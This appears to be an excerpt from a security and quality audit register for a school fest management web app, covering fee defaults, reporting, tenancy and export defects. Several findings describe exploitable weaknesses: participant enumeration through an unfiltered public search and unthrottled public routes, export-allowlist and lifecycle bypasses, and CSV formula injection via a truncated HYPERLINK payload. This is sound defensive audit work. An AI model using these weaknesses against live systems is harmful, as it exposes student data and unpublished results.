**`CERT-04`** — The entire certificate feature has zero test coverage. P2 · test_gap. Expected: a feature this security- and data-integrity-sensitive should carry baseline regression tests. Actual: `grep -rl "FestCertificateService\|FestCertificateController\|FestCertificateOpsController"` across `tests/` returns zero matches, including route names. Both `CERT-01`/`CERT-02`'s regression tests had to be built completely from scratch with no existing fixture to build on. Fix: add the `CERT-01`/`CERT-02` verification tests to the permanent suite plus a happy-path test for `generate()`/`generateParticipation()`/`downloadZip()`. Scope: medium. Dependencies: coordinate with `CERT-01`/`CERT-02` fixes.

**Data integrity (Audit 1 §6.8):**

**`DATA-02`** — Team/group chest numbers lost their unique-constraint backstop; individual participants kept theirs. P2 · confirmed. Actors: Sahodaya/State Admin generating chest numbers for team/group items. Expected: `fest_groups.chest_no` should carry a DB-level uniqueness backstop equivalent to `fest_participants_event_head_chest_unique`. Actual: `fest_groups_event_chest_unique` existed, was dropped while `fest_participants` was rescoped to a head-scoped replacement, and a second same-day migration force-drops it again defensively — no migration afterward ever re-adds any `fest_groups` index (this is the same underlying schema gap `TECH-01[TechAudit]` independently reproduces live in Audit 3, from a different angle — see §9.2). `FestNumberingService`'s `lockForUpdate()` locks only the single passed event row while the `MAX()` computation spans `reportableEventIds()` (hub+children) — two calls against different-but-related event ids in that set are not mutually exclusive. Fix: add a replacement unique index on `fest_groups` scoped the same way `fest_participants` now is. Tests: none exist. Scope: small. Dependencies: same schema area as `TECH-01[TechAudit]` — fix once.

**`DATA-06`** — Tenant/event/registration ownership is consistently enforced by manual, redundant checks across every sampled controller. P2 · not_a_gap (positive, sampling-based). Expected: an ID belonging to another tenant/event should never be reachable through a URL/form/API payload built for the acting user's own tenant. Actual: confirmed enforced in two redundant layers everywhere sampled — route middleware tenant checks, plus explicit per-action ownership re-checks. No automatic Eloquent global scope exists for any Fest model. `StateCrossIsolationTest` (8/8, 51 assertions) and `RegionAdminReportContainmentTest` (9/9, 59 assertions) both re-run clean. Impact: none — positive finding, but manual/repetitive with no base-controller auto-scoping across ~45 controller files/150+ actions; this exact class of gap has independently slipped through before (`Event-ops EVT-01`, `NAV-SEC-01`, `SA-01`). Recommendation: a full mechanical sweep of every Fest-typed controller parameter, explicitly not yet performed by any of the three audits (§16/unverified areas).

**UI/navigation — School Admin (Audit 1 §6.9):**

**`UI-School EVT-02`** — A Sports Meet coordinator's bare hub URL 403s, unlike every other program's. P2 · confirmed. Actors: `school_event_coordinator` scoped to `sports-meet`. Expected: the bare Sports Meet hub URL should open the same way every other program's bare hub URL does for an identically-scoped coordinator. Actual: `EventCoordinatorScope::inferProgramSlug()` matches the other 6 programs via `str_contains($path, "/{$slug}")` with no trailing-slash requirement, but the sports check requires a trailing slash or `/sports-meet` — for the bare path, neither matches, `inferProgramSlug()` returns `null`, and the request falls into a fallback that only allows `/fest/hub`/`/fest/reports` paths. Reproduced: sports-scoped coordinator on bare `/school-admin/{id}/sports` → 403; identically-scoped-but-`kalotsav` coordinator on bare `/kalotsav` → 200; the sports coordinator on `/sports/registration` (trailing segment) → 200 — isolates the bug to exactly the bare hub path, which is also that coordinator's own post-login landing URL. Fix: fix the sports branch to match the same way the other six do, ideally via a shared program-prefix map. Tests: none exist. Scope: small. Dependencies: none.

**`UI-School EVT-03`** — A materially better Student-wise report page was committed but is unreachable, and its data pipeline wasn't finished either. P2 · confirmed. Actors: School Admin and school-level fest roles. Expected: the most recently committed version of the Student-wise report (photos, name-search, PDF preview) should be reachable. Actual: `ReportStudentWise.vue` sits outside the `Pages/Admin/**` glob root, unbundled; `FestSchoolReportController::studentWise()` renders a name that resolves to a *different*, plainer live file. The two are materially different in markup, data shape, and features. The stranded page's expected props (`student_id`/`photo_url`/`item_count`) don't match what `studentWise()` actually sends (`student`/`registrations`/`total_score`) — the commit's real backend work went into a different Sahodaya-side analytics service. Impact: moving the file alone would produce a page that renders with blank names/photos/items — the "lost work" is real but incomplete, not a finished page merely misplaced. Fix: move the file into the live tree (deleting the stranded copy) AND update `studentWise()`'s prop shape to match. Tests: N/A (reachability finding). Scope: medium. Dependencies: part of the broader ~10-file dead-`.vue` cleanup (§14/§16 unverified areas).

**State Admin (Audit 1 §6.11):**

**`SA-03`** — Sports/MCQ state-tier rollup pages have no graceful degradation if a cluster's DB isn't ready. P2 · likely (sandbox cannot exercise this — §1.5). Actors: `state_admin`/`state_staff`/superadmin via `/admin/sports`, `/admin/mcq-results`. Expected: per-Sahodaya-cluster queries should degrade gracefully, matching every sibling controller in the same directories (`TenancyDatabase::whenDatabaseReady()`). Actual: `SportsResultsController`'s foreach calls `$sahodaya->run(function(){...})` directly with no readiness check and no try/catch; `McqStateResultsController` has an identical unguarded pattern, its own comment claiming a parity with `AuditPaymentIntegrity.php`'s try/catch wrapping that isn't actually implemented. Not reproducible in this sandbox — `config/tenancy.php` filters the tenancy bootstrapper out when `TENANCY_DATABASE_PER_SAHODAYA=false`. Impact (production): any single active Sahodaya whose database isn't yet migrated would make `tenancy()->initialize()` throw uncaught inside the loop, 500ing the entire page for every state/super admin instead of omitting just that cluster's rows. Fix: replace the raw loop with `TenancyDatabase::whenDatabaseReady()`. Tests: none exist for either controller. Scope: small. Dependencies: part of the `TIF-01`/`TECH-02[TechAudit]` sandbox-limitation cluster.

**`SA-04`** — The State Finals tier has no appeals, certificates, or championship/trophy standings at all. P2 · design_gap. Actors: `state_admin`. Expected: some in-app path for participant appeals/disputes, certificate issuance, and championship points at the State tier, matching one tier down at Sahodaya. Actual: every appeal/certificate/championship match in the codebase lives under the Sahodaya/tenant/public namespace — zero results under any State-tier naming. `StateFestWorkspaceController`'s method list stops at `publishResults`/`assignChestNumbers` — no appeals or certificate entry, no "provisional results" concept. Impact: the conduct pipeline dead-ends at "publish results" — a State Finalist disputing a mark, or a Sahodaya expecting a trophy tally, has no in-app path. Fix: scope State-tier Appeal/Certificate/Championship work as its own follow-up (large), or explicitly document it as out of scope for this rollout phase — product decision, §17. Tests: N/A pending the product decision. Scope: large. Dependencies: none technically, but blocked on a scope decision.

**Public/API (Audit 1 §6.12):**

**`PUB-02`** — The public schedule page renders empty for phased events during almost the entire window it's supposed to be useful. P2 · confirmed. Actors: public visitor. Expected: the combined (`phase:{id}`) and "overall" schedule scopes should show every row whose phase and leaf both have `schedule_published=true`, independent of `results_published`. Actual: `PublicFestScoreboardService::scopes()` computes the phase-combined scope's event_ids by filtering leaves on `results_published=true`, not `schedule_published`, even though the same scope entry independently carries the phase's own `schedule_published` flag; `overallEventIds()`'s phased branch does the same double filter, while the boolean gating the "overall" scope's *visibility* correctly checks `schedule_published` only. Reproduced: a phase with schedule published but results not — leaf-direct item page shows the item; the combined/overall schedule pages both return 200 but render empty. Impact: for any Sahodaya running phase-based conduct, the schedule page — the page participants/parents actually need before the event — silently shows nothing for most of the window it exists to serve, likely generating support load during a live multi-phase event. Fix: give the schedule-page code path its own `schedule_published`-keyed event-ids resolution. Tests: none cover the public schedule page for a phased event. Scope: small. Dependencies: same theme as `PHASE-03`.

**`PUB-03`** — An unrecognized public search query falls through to an unfiltered participant dump on strict-anonymity events. P2 · confirmed. Actors: public visitor. Expected: per the "chest-only until results" design, a query matching none of the recognized shapes should return no results. Actual: `FestPortalController::search()`'s if/elseif/elseif chain has no `else` branch — if the query matches none of the three recognized shapes and `allowNameSearch()` is false, no `where()` clause is added, and the unfiltered base query runs as-is, returning up to 30 approved participants. Reproduced: district-level (strict anonymity) event, unrecognized query → 200, response contains item title and chest number. Impact: lets a visitor enumerate (up to 30 rows per request) which chest numbers are registered for which items before the schedule is published — rival-school competitive intelligence; lower severity than `PUB-01` (no name, no timing, capped, atypical trigger). Fix: return an empty result set when none of the three shapes match. Tests: none exercise `search()` at all. Scope: trivial. Dependencies: none.

**Phase lifecycle (Audit 2 §1):**

**`PHASE-04`** — Stale docblocks claim the lifecycle gates are unwired; both are live. P2 · confirmed. Expected: docblocks should describe current behavior. Actual: `allowRegistrationForItem()`/`allowMarkEntryForItem()` docblocks still say "Deliberately NOT wired into any existing call site" — both are live on 1 and 6 call sites respectively. Impact: a maintainer trusting the docblock could believe these gates don't matter and skip testing them. Fix: update the docblocks. Tests: N/A (documentation). Scope: trivial. Dependencies: none.

**`PHASE-05`** — Attendance entry/bulk import has no lifecycle gate of any kind. P2 · confirmed. Expected: attendance recording should respect *some* event/phase status boundary. Actual: zero `EventLifecycleGate` calls, zero status/phase/results_published checks anywhere in `FestAttendanceController`/`FestAttendanceImportService`; the controller's own docblock documents this as a deliberate choice. Impact: attendance can be recorded/altered at any point in an event's lifecycle including after completion, relying entirely on UI convention rather than a server-side boundary. Fix: confirm this is intentional (product decision, §17) or add a lifecycle gate matching the pattern used elsewhere. Tests: N/A pending the decision. Scope: small if built. Dependencies: none.

**Fee catalog (Audit 2 §7):**

**`FEE-03[Catalog]`** — Late fee/registration-deadline penalty is entirely absent for Fest events. P2 · design_gap. Expected: parity with MCQ (`LateFeeCalculator`) and Training, both of which have this built and tested. Actual: Fest's 7 fee-computation files have zero late/penalty/overdue/grace-period logic of any kind. Impact: no product-level path exists to charge a late fee for a Fest registration, unlike sibling modules. Fix: build if product wants parity — §17. Tests: N/A pending the decision. Scope: medium if built. Dependencies: none.

**`FEE-04[Catalog]`** — Per-school discount is entirely absent for Fest events. P2 · design_gap. Expected: parity with MCQ (`McqSchoolFeeService::breakdownForSchool`, tested). Actual: no equivalent field anywhere in the Fest fee engine. Impact: no way to apply a per-school discount to a Fest fee, unlike MCQ. Fix: build if product wants parity — §17. Tests: N/A. Scope: medium if built. Dependencies: none.

**`FEE-05[Catalog]`** — `flat_school` fee model is implemented correctly but has zero test coverage. P2 · test_gap. Expected: a live, correct fee model should have regression coverage. Actual: hand-traced correct (`flat_amount` bills exactly once, independent of item/student counts), but no test exists anywhere. Fix: add a test locking in the current-correct behavior. Scope: trivial. Dependencies: none.

**`WYN-02`** — No student-count sub-threshold exists within one class-category tier (Wayanad's stated 300-student Secondary split). P2 · design_gap. Expected: Wayanad's brief describes a count-based sub-branch within the Secondary tier. Actual: neither of the two parallel tier-lookup implementations accepts a count-based sub-branch at all. Impact: this specific piece of Wayanad's stated rule cannot be configured today. Fix: confirm this is a real requirement (§17), then extend both tier resolvers. Tests: N/A pending the decision. Scope: medium if built. Dependencies: none.

**`KOCHI-07`** — Kochi Metro's unconfigured school-registration fee silently defaults to ₹2,000, not ₹0. P2 · confirmed. Expected: leaving `school_registration_flat` blank should resolve to ₹0 (no charge), or at minimum should not silently apply an arbitrary non-zero default. Actual: `schoolRegistrationAmount()` and the settings normalizer both independently default it to ₹2,000. Reproduced 3 independent times: `total_due` came out ₹2,100/₹2,400/₹2,300 across 3 scenarios where the intended school fee was ₹0. Impact: a single admin oversight (leaving one form field empty) silently overbills every affected school by the full ₹2,000 default with no warning. Fix: fix the silent default at both the normalizer (`FestEventFeeResolver::normalizeEventFeeSettings()`) and resolver (`schoolRegistrationAmount()`) layers — fixing only one leaves the other reachable. Tests: none exist. Scope: small. Dependencies: none.

**`MLB-02`** — Malabar's 0-student slab defaults to the *highest* tier (₹12,000), not ₹0 or the lowest. P2 · confirmed. Expected: zero linked students should bill ₹0 or the lowest tier. Actual: `studentCount=0` falls through the slab lookup to the top tier. Reproduced: ₹12,000 for 0 students. Impact: a school with no linked students yet (a transient registration state) gets billed the maximum slab amount. Fix: fix the 0-student default to ₹0 or the lowest tier. Tests: `studentCount=0` and the unlinked-participant transient state — currently uncovered. Scope: small. Dependencies: coordinate with `MLB-01`'s combined-model build, since both touch the same dispatch code.

**`MCS-02`** — MCS's item catalogue, phase map, and `tenant_id` are an unfilled template. P2 · confirmed (data/config gap, not a code defect). Expected: a rollout-ready data file. Actual: `app/Support/data/mcs_kalotsav_phase_plan.php` has an empty item-to-phase mapping (two commented-out example lines only), an 18-line item catalogue that mostly reuses a *different* Sahodaya's (CKSC's) 145-line catalogue wholesale, and `tenant_id` still the literal placeholder `REPLACE_WITH_MCS_SAHODAYA_TENANT_ID`. Impact: MCS's per-item fee figures cannot be verified because they don't exist in the repo to compare against — acknowledged next step before rollout per `docs/MCS_FOUR_PHASE_COMPLETION_PLAN.md`'s own status line. Fix: populate the real data before any MCS rollout — expected pre-launch data work, not a code fix. Tests: N/A. Scope: data-entry effort, not engineering. Dependencies: blocks MCS onboarding.

**`MCS-05`** — Reports correctly filter by payment level in addition to phase and region. P2 · not_a_gap (positive). Confirmed via a passing test (`FestPhasedRegionalBillingWorkflowTest`). No gap found.

**`TIF-01`** — Physical multi-tenant database isolation has never been exercised by any test, and a common "fix" attempt gives false confidence. P2 · test_gap. Expected: some test coverage of `tenancy.database_per_sahodaya=true`, the actual production default. Actual: the entire suite runs with the real bootstrapper (`DatabaseTenancyBootstrapper`) switched off at the OS-environment level (`phpunit.xml`). A naive fix attempt — calling `config(['tenancy.database_per_sahodaya' => true])` inside a test — does **not** work: `config/tenancy.php` computes its bootstrapper list once at boot from `env()`, not from live `config()` reads, so the real bootstrapper still never runs even though `TenancyDatabase::enabled()` (which reads `config()` live) would report `true`. A future engineer "fixing" this with a runtime override would get false confidence rather than real coverage. Impact: nothing has failed in production because only one tenant is currently live, but this is the mechanism that would matter most the moment a second real Sahodaya is provisioned — the single most consistently-flagged "cannot verify" boundary across all three audits (§1.5). Fix: a real integration test booted with the process/OS-level env var set before boot, against two tenants on separate physical connections — cannot be closed any other way. Scope: infrastructure work (test environment, not application code). Dependencies: gates `CERT-03`, `SA-03`, `TECH-02[TechAudit]` from ever being fully closed.

**`FEE-01[Precedence]`** — No single function documents the full fee-resolution precedence chain. P2 · confirmed. Expected: a maintainer should be able to find the whole chain in one place. Actual: it's reconstructed from 4 separate files (`FestSchoolEventFeeService`, `FestItemFeeResolver`, `FestEventFeeResolver`, `config/fest_fees.php`) with no single documenting function. Impact: maintenance risk — a future change is more likely to introduce a precedence bug because no one file shows the whole picture. Fix: add one documenting method/comment block tracing the full chain, or add a lightweight CI grep step flagging future tenant-identity-style shortcuts in the same area. Scope: trivial (documentation). Dependencies: none.

**`FEE-08[Precedence]`** — The sports-fee override (step 3b) is all-or-nothing across 5 fields with no field-by-field reconciliation. P2 · confirmed. Expected: a Sahodaya configuring sports fees via the JSON surface should have that configuration respected unless explicitly overridden field-by-field. Actual: `hasSportsFeesConfigured()` is a simple OR across 5 columns checking `!== null` — a literal `0` on any one column satisfies it, and when true, all 5 fields switch from the JSON surface to the column surface at once; the two surfaces don't even share key names. Impact: a Sahodaya configuring sports fees via JSON while any one dedicated column happens to be non-null gets that JSON silently and completely discarded. Fix: reconcile field-by-field instead of all-or-nothing. Tests: none exist. Scope: medium. Dependencies: none.

**`FEE-02[Hardcoded]`** — An unconfigured sports event silently bills config defaults; an identically unconfigured Kalolsavam event fails safe to no charge. P2 · design_gap. Expected: consistent behavior for an unconfigured event, regardless of type. Actual: an unconfigured sports event adopts `config('fest_fees.level_defaults.sports')` (₹2,000 school / ₹300 student / 2 included items / ₹150 extra) as a live, billable schedule the moment it's created; an identically unconfigured Kalolsavam event correctly resolves `fee_model='none'` via the same dispatcher. No lifecycle gate checks fee configuration before letting either type reach `registration_open`. Reproduced: sports `feeRequired()`=true by default; Kalolsavam `feeRequired()`=false by default. Impact: a Sahodaya creating a sports event without touching fee settings could unknowingly start billing schools a real amount. Fix: decide whether unconfigured sports events should keep silently billing config defaults, or fail safe like Kalolsavam — product decision, §17. Tests: lock in today's actual (risky) behavior first, so a future change to either is deliberate. Scope: small once decided. Dependencies: product decision.

**Report inventory (Audit 3 §1):**

**`RPT-01`** — Region-aware reports silently drop a phase's data on phase-based hubs. P2 · data-integrity issue. Actors: Sahodaya admin/region admin. Expected: opening a region's tile for any `REGION_ID_AWARE_IDS` report via `?region_id=` should include every phase's data for that region, matching what `FestReportScopeResolver` already resolves correctly for the identical input. Actual: `regionAwareTargetEvent()` resolves the target purely via `FestEvent::regionalChild($regionId)` — plain `where('region_id',...)->first()`, no phase filter, no ordering; on a `phased_regional_billing` hub two phases can legitimately spawn separate child events sharing one `region_id`, so `regionalChild()` silently returns one, and the other phase's rows never appear. Reproduced via a scratch test building the exact 2-leaves-1-region collision. Impact: a region admin viewing fee-collection or participation numbers on a multi-phase hub gets a silent undercount, in both the on-screen report and the matching export/PDF. Fix: make `regionalChild()`/`regionAwareTargetEvent()` phase-aware, or retire this parallel mechanism in favor of routing through `FestReportScopeResolver`'s already-correct resolution. Scope: small–medium. Dependencies: shares theme with `PHASE-01`/`PHASE-02`/`PHASE-03`.

**`RPT-02`** — Cross-school export blocking is real but fragile, with 2 confirmed bypass routes. P2 · test_gap. Actors: School admin. Expected: the documented P0 fix ("school users can request cross-school fest exports") should be locked in by a permanent test. Actual: the control works today (independently re-verified: non-allowlisted export → 403, allowlisted → 200), but `grep -rln "isSchoolSafe|SCHOOL_SAFE_EXPORT_IDS" tests/` returns zero matches. Worse, `FestSchoolReportController::groupRoster()`/`attendanceSheet()` call `FestReportService::export()` **directly**, bypassing the allowlist check entirely — both are safe *only* because they separately hardcode `school_id` in their own query, a second, undocumented safety mechanism. Impact: the allowlist is one accidental edit — or one more dedicated bypass route — away from silently reopening cross-school data exposure, with nothing in CI to catch it. Fix: add a permanent test asserting every non-allowlisted id 403s; route the two bypass methods through the allowlist-checked dispatcher. Scope: small. Dependencies: none.

**`RPT-03`** — `FestSchoolReportBoundaryTest` is currently red. P2 · test_gap. Expected: a school admin should get 404 opening a report route for an event whose type doesn't match the URL's program prefix. Actual: the app now **redirects (302)** instead — a deliberate UX change the test wasn't updated for. Independently reproduced fresh in this pass's own execution (§20). Impact: a currently-red test undermines confidence in this exact area and risks masking a real future regression in the same redirect logic. Fix: update the assertion to expect the redirect; add a companion test for the cases where the middleware's `abort_unless` branch still legitimately applies. Scope: trivial. Dependencies: none.

**`RPT-04`** — No State-tier consolidated results/points export exists. P2 · missing feature. Actors: State admin. Expected: a cross-Sahodaya, exportable results/points/school-ranking summary, analogous to the Sahodaya-level Overall Ranking/Medal Tally exports. Actual: `StateResultPublicationService::schoolRankings()` is computed but returned only as an inline Inertia prop; `StateFestWorkspaceController` has exactly 8 methods, none returning anything but a render/redirect; a grep for pdf/csv/export/print/report across both `routes/web.php` and the separate `routes/state.php` returns zero matches. Impact: the body running the top tier of the Kalolsavam hierarchy has no way to distribute a consolidated results/points sheet — every Sahodaya-level event gets dozens of exports; State gets none. Fix: add at minimum a PDF/CSV export of `schoolRankings()`. Scope: medium. Dependencies: none.

**`RECON-03`** — `forceApprove()` overwrites the real receipt amount instead of waiving the delta. P2 · data-integrity issue. Actors: Sahodaya Admin (force-approve action). Expected: waiving a residual mismatch should use `FeeReceipt`'s own `waiver_amount`/`waiver_reason` columns, preserving the receipt's true uploaded amount. Actual: `forceApprove()` directly overwrites `FeeReceipt.amount` to the current `total_due`, discarding whatever the school's uploaded proof actually showed — no waiver fields recorded, no pre-overwrite amount audit-logged, no `lockForUpdate()` guard against the same race `approve()` explicitly locks against, no overpayment-to-credit reconciliation. The docblock misdescribes the mechanism (claims it brings `total_due` down; it actually rewrites the receipt). The UI only surfaces this for `status='partial'` rows, but the controller has no server-side status gate. Impact: the system's "official" payment record can end up numerically disagreeing with the school's real uploaded proof, with no trail to reconstruct the original figure in a dispute. Fix: record the delta via `waiver_amount`/`waiver_reason`; add the same overpayment-to-credit reconciliation and lock `approve()` already has; fix the docblock. Scope: small–medium. Dependencies: none.

**`RECON-06`** — Zero tests touch the buggy report/export classes at all. P2 · test_gap. Expected: the classes underlying `RECON-01`/`RECON-02` should have test coverage. Actual: `grep -rlni "FestExportService|feeSummary|FestSchoolReportAnalyticsService" tests/` returns zero hits anywhere; the only "parity" tests that exist cover access-control row-level parity, not money-value agreement. Impact: `RECON-01`/`RECON-02` could regress again immediately after being fixed, with nothing in the suite to catch it. Fix: add the regression tests called for under `RECON-01`/`RECON-02`, plus a generic "preview total equals export total" parity test parametrized across the finance-dataset report ids. Scope: medium. Dependencies: coordinate with `RECON-01`/`RECON-02` fixes.

**Security audit (Audit 3 §3):**

**`SEC-02[SecAudit]`** — No rate limiting on the public Fest portal route group. P2 · security issue. Actors: public/anonymous. Expected: publicly reachable, database-query-driven or rendering-heavy endpoints should be rate-limited, matching every sibling public route group in the same file. Actual: `routes/tenant.php`'s `fest` prefix group (15 GET routes) carries no throttle middleware anywhere — the only public group in the file without one; siblings all opt in (`throttle:10,1`/`20,1`/`30,1`/`60,1`). `formatPublicParticipant()` always returns `reference`/`link_ref`/`item_title` regardless of publication state, so unlimited-rate enumeration maps which chest/level-reg numbers exist pre-publication. Impact: an attacker can enumerate the full chest-number/level-reg-number space at unlimited speed pre-publication, and fully scrape names+schools+marks within seconds of `results_published` flipping true; the same gap exposes PDF rendering, poster SVG rendering, and live-data DB aggregation to unlimited-rate resource exhaustion. Fix: apply `throttle:X,1` to the `fest` prefix group, sized similarly to the neighboring `academic-results` group or tighter for search/participant specifically. Scope: small. Dependencies: none.

**Report lifecycle and visibility (Audit 3 §4):**

**`SEC-06[Lifecycle]`** — Phase-scoped export is blocked by a wrong-order lifecycle check. P2 · broken workflow. Actors: Sahodaya/event/region-admin staff. Expected: per the codebase's own docblock, a `phase_mode_enabled` event's after-phase export for one already-published phase should become available once that phase (not the whole event) is published. Actual: the coarse, event-wide `enforceReportLifecyclePhase()` runs **unconditionally before** the finer, phase-specific carve-out check, 403ing the request before the carve-out is ever reached — because `allowedReportPhases()` only includes `'after'` once the event-wide `results_published` is true, exactly the scenario the carve-out exists to handle. Impact: blocks a legitimate, code-documented early-per-phase-export workflow for staff running `phase_mode_enabled` events. Fix: evaluate the phase-specific check before the event-wide gate, or teach `allowedReportPhases()` to accept an optional `competition_phase_id`. Scope: small. Dependencies: same fix effort as `PHASE-03`/`SEC-05[Lifecycle]`.

**`SEC-03[Lifecycle]`** — Legacy `export.results` has zero lifecycle gate. P2 · security issue. Actors: Sahodaya/event/region-admin staff via the legacy route. Expected: a results export should be unavailable pre-publish regardless of endpoint, per `allowResultReport()`'s own stated rule. Actual: `FestExportController::results()` calls `FestExportService::results()` directly with zero lifecycle check anywhere in the 38-line controller, while the catalog-driven path calls both `allowReportExport()` and `allowResultReport()`. Impact: combined with `SEC-01[Lifecycle]`, an out-of-region actor reaching this route gets both the authorization bypass and the lifecycle bypass simultaneously — full unpublished, cross-region results in one request. Fix: add `EventLifecycleGate::allowResultReport()` to `FestExportController`'s methods, or retire the controller per `SEC-01[Lifecycle]`'s recommendation. Scope: small (subsumed by `SEC-01[Lifecycle]`'s fix). Dependencies: same fix as `SEC-01[Lifecycle]`.

**Export quality (Audit 3 §5):**

**`EXP-02`** — CSV/Excel formula injection, reproduced via the live fees-export route. P2 · security issue (same bug class as `SEC-01[SecAudit]`/`SEC-01[TestExec]`, cross-referenced, §9.2). Independently re-confirmed by re-reading `ExcelExport.php` and re-running the sibling scratch test against the raw-`fputcsv`-based `FestEventFeesController::exportPayments` route rather than the XML path — the same unneutralized `=HYPERLINK(...)` payload, this time RFC4180-quoted by `fputcsv` (routine CSV quoting, not a security fix; a spreadsheet app still parses it as a live formula on open). Fix: same shared `neutralizeFormulaCell()` helper, applied centrally. Scope: subsumed by `SEC-01[SecAudit]`'s fix.

**`EXP-03`** — Zero Malayalam-script text anywhere in the test suite. P2 · test_gap. Expected: given `EXP-01`, at least one export/report test should assert Malayalam-script names survive export correctly. Actual: a methodology correction on the original claim — one cited file has 6 keyword hits for "Malayalam," but every hit is the English word used as a school-*subject* name in unrelated board-exam tests, not Malayalam script. A stronger check (`grep -rlP '[\x{0D00}-\x{0D7F}]' tests/`, the actual Unicode block) returns zero files anywhere in `tests/`. Impact: given `EXP-01`, this is not theoretical — the untested scenario is actually broken in production-adjacent (dompdf-fallback) configurations. Fix: add a fixture with a Malayalam name to at least one PDF and one CSV/Excel export test; a PDF assertion must check actual glyph rendering (rendered-image diff or embedded-font cmap check), not `pdftotext`-extracted text, since `EXP-01` proved `pdftotext` gives a false pass. Scope: small. Dependencies: coordinate with `EXP-01`'s fix.

**`EXP-04`** — No UTF-8 BOM on hand-rolled CSV exports. P2 · data-integrity issue. Expected: CSV exports containing non-ASCII text should be BOM-prefixed so Microsoft Excel (the default handler for a downloaded `.csv` on the overwhelming majority of school-office Windows machines) correctly auto-detects UTF-8. Actual: zero BOM anywhere across `FestReportService::clashesCsv()/itemScheduleCsv()/promotionsCsv()` and `FestSchoolReportController`'s 5 CSV-exporting methods (~8 call sites total). Impact: independent of `EXP-01`'s PDF/font issue — even with PDF rendering fixed, CSV exports of the same data would still corrupt Malayalam text for the most common real-world open method (double-click in Windows Excel). Fix: prepend `"\xEF\xBB\xBF"` before the first byte of every hand-rolled CSV response; centralize CSV generation through one shared helper (currently duplicated independently across ~8 sites). Scope: small. Dependencies: none.

**`EXP-05`** — No chunking anywhere in the export layer; full XML built in memory before streaming. P2 · performance risk. Actual: `grep -rn "->chunk(\|->cursor(\|->lazy(\|LazyCollection"` across the report/export controllers and services returns zero matches; `ExcelExport::download()` streams via a single `print()` of the entire XML document, but `spreadsheetXml()` builds that document via repeated string concatenation **before** the print call — the underlying data generation isn't chunked even though the HTTP layer streams. Impact: for a Sahodaya-wide multi-school export, one PHP worker holds the full row set **plus** a full duplicate XML-string representation in memory simultaneously, with no fallback if that exceeds `memory_limit`. Fix: use `->cursor()`/`->lazy()` for feeding queries; rewrite `spreadsheetXml()` to yield/write chunks incrementally. Scope: medium. Dependencies: shares theme with `TECH-08[TechAudit]`.

**`EXP-06`** — No memory/time budget or async fallback for heavy exports. P2 · performance risk. Actual: only 2 `set_time_limit`/`ini_set` bumps exist across the whole export/report surface, both guarding the same GD-image-decoding reason (ID cards, attendance-sheet PDF) — none of the data-table CSV/Excel/PDF builders have an equivalent. `CsvExportDispatcher`'s size-threshold → queued-job pattern exists and is used by 4 named controllers plus the generic ERP `ReportRunner`, but none of the Fest module's own `FestExportService`/`FestReportService`/`FestSchoolReportExportService` builders route through it. Impact: a large "all-registrations"/"all-results" export for a big event runs synchronously inside the web request with no queued alternative — it can time out or hit an out-of-memory 500 with no partial-progress recovery, the same failure class already fire-fought once for a related but different code path. Fix: wire the Fest builders through the existing `CsvExportDispatcher` pattern, or at minimum apply the proven limit bump. Scope: medium. Dependencies: none.

**Technical audit (Audit 3 §6):**

**`TECH-04[TechAudit]`** — Soft-deleted students vanish from reports but stay billed. P2 · data-integrity issue. Actors: Sahodaya Admin (fee totals, reports); School Admin (roster maintenance). Expected: a soft-deleted student's billing status and report visibility should be consistent with each other. Actual: `FestParticipant::student()` is a plain `belongsTo` with no `withTrashed()`, so a soft-deleted student silently vanishes from every relation-based read including report row-builders (`$p->student?->name ?? ...` → null); `FestSchoolEventFeeService::billableStudentCount()` counts directly off `fest_participants.student_id IS NOT NULL`, never joining through `Student`, so it's completely unaffected by the soft-delete and keeps billing. Reproduced: `billableStudentCount()=1` both before and after `$student->delete()`; the participant's `student?->name` goes from the real name to `NULL` immediately after. Impact: a school can be billed a participation fee for a student who no longer shows up by name anywhere in that event's participant reports — an anonymous, hard-to-dispute charge. Fix: either exclude soft-deleted students from billable counts, or explicitly `withTrashed()` the relation in report row-builders so the name still renders (with an inactive marker) while still being charged. Scope: small. Dependencies: none.

**`TECH-05[TechAudit]`** — `fest_marks` has no usable `event_id` index. P2 · performance risk. Actual: `fest_marks` declares only `unique(['item_id','participant_id'])` — no index has `event_id` as a leftmost column, and neither Postgres nor SQLite auto-indexes FK columns, so a bare-`event_id` filter forces a sequential scan. 22 `FestMark::where/whereIn('event_id', ...)` call sites exist across `EventLifecycleGate`, `FestJudgeGateService`, `FestLifecycleService`, `FestPhasedWorkflowService`, `FestQualificationService`, `FestSportsAutoRankService`, `FestReportService`, `FestSchoolReportAnalyticsService`. The sibling `fest_registrations` table already got this exact fix in a dedicated migration — `fest_marks` never did. Fix: add an index on `fest_marks(event_id)` (or `(event_id, item_id)`), mirroring the fix already applied to `fest_registrations`. Scope: trivial (one migration). Dependencies: none.

**`TECH-06[TechAudit]`** — 5 report methods query per bucket inside a loop instead of batching once. P2 · performance risk. Actual: `headWiseParticipantRows()`, `sportsWiseParticipantRows()`, `areaWiseParticipantRows()` (twice over), and `teamSquadRows()` each run a fresh query inside a `foreach` over the bucket collection; a fifth, `certificateCountsCsv()`, runs 4 separate queries **per school** in a loop, reachable today via the live, catalog-registered `certificate-counts` export. The positive-contrast method demonstrating the correct batch-then-group-in-memory pattern is `markEntryStatusRows()`, not "`itemStatusRows()`" as an earlier citation had it (that method doesn't exist in the codebase). Impact: for an event with 10-30+ item heads, or a Sahodaya with dozens to hundreds of schools, these endpoints issue tens to hundreds of avoidable round-trips on every generation. Fix: apply `markEntryStatusRows()`'s already-demonstrated batch-then-group-in-memory rewrite to all 5 sites. Scope: medium. Dependencies: none.

**`TECH-07[TechAudit]`** — Batch invoice issuance is a non-atomic 2-step write. P2 · data-integrity issue. Actors: Sahodaya Admin (batch invoice issuance). Expected: issuing a batch invoice should be atomic. Actual: `FestInvoiceService::issueForSchoolBatch()` first calls `recalculateBatch()` (commits in its own internal transaction), then, as a separate top-level statement, calls `FestEventInvoice::updateOrCreate()` — neither call nor the method as a whole is wrapped in an outer `DB::transaction()` (a full-file grep confirms zero `DB::transaction` usage in the 337-line service). `batchInvoiceNumber()` allocates the next number via an unsynchronized `count()`-then-+1 read with no lock; a collision is backstopped by the table's unique constraint but surfaces as an unhandled hard failure on the losing concurrent request. Impact: a mid-request failure while issuing a batch invoice leaves a school's fee total and invoice record out of sync with no automatic recovery. Fix: wrap the recalculate-then-upsert sequence in `DB::transaction()`; allocate `batchInvoiceNumber()` under the same row lock `FestNumberingService` already uses. Scope: small. Dependencies: none.

